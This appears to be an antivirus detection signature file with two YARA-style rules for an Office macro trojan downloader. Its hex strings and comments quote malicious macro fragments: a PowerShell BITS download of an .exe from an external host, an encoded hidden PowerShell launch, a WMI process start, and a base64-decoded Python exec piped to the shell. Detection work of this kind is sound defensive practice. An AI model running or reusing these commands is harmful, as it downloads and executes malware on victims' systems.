
rule TrojanDownloader_O97M_Powdow_AV_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AV!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e } //1 ll.Application").Open
		$a_01_1 = {2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 71 64 79 68 79 67 6d 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 70 6c 75 67 69 6e 73 2f 6d 61 73 74 65 72 78 2f 66 52 54 6e 73 6f 6c 65 73 33 2e 65 60 78 65 22 20 26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 79 65 73 74 68 6f 75 73 61 6e 64 2e 65 60 78 65 } //1 -w h Start-BitsTransfer -Source htt`p://qdyhygm.com/wp-content/plugins/masterx/fRTnsoles3.e`xe" & " -Destination C:\Users\Public\Documents\yesthousand.e`xe
		$a_01_2 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 64 69 66 66 65 72 65 6e 63 65 64 61 74 61 2e 62 61 74 } //1 C:\Users\Public\Documents\differencedata.bat
		$a_01_3 = {68 65 6c 6c } //1 hell
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Powdow_AV_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.AV!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e 6d 67 6d 74 73 3a 5c 5c 2e 5c 72 6f 6f 74 5c 63 69 6d 76 32 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29 } //1 = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
		$a_01_1 = {3d 20 6f 62 6a 57 4d 49 53 65 72 76 69 63 65 2e 47 65 74 28 22 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 29 } //1 = objWMIService.Get("Win32_ProcessStartup")
		$a_01_2 = {3d 20 22 70 6f 77 65 72 73 68 65 6c 6c 20 2d 6e 6f 50 20 2d 73 74 61 20 2d 77 20 31 20 2d 65 6e 63 } //1 = "powershell -noP -sta -w 1 -enc
		$a_01_3 = {3d 20 73 79 73 74 65 6d 28 22 65 63 68 6f 20 22 22 69 6d 70 6f 72 74 20 73 79 73 2c 62 61 73 65 36 34 3b 65 78 65 63 28 62 61 73 65 36 34 2e 62 36 34 64 65 63 6f 64 65 28 5c 22 22 20 22 20 26 20 53 74 72 20 26 20 22 20 5c 22 22 29 29 3b 22 22 20 7c 20 2f 75 73 72 2f 62 69 6e 2f 70 79 74 68 6f 6e 20 26 22 29 } //1 = system("echo ""import sys,base64;exec(base64.b64decode(\"" " & Str & " \""));"" | /usr/bin/python &")
		$a_01_4 = {3d 20 22 68 74 74 70 3a 2f 2f 31 32 37 2e 30 2e 30 2e 31 2f 74 72 61 63 6b 69 6e 67 3f 73 6f 75 72 63 65 3d 22 } //1 = "http://127.0.0.1/tracking?source="
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}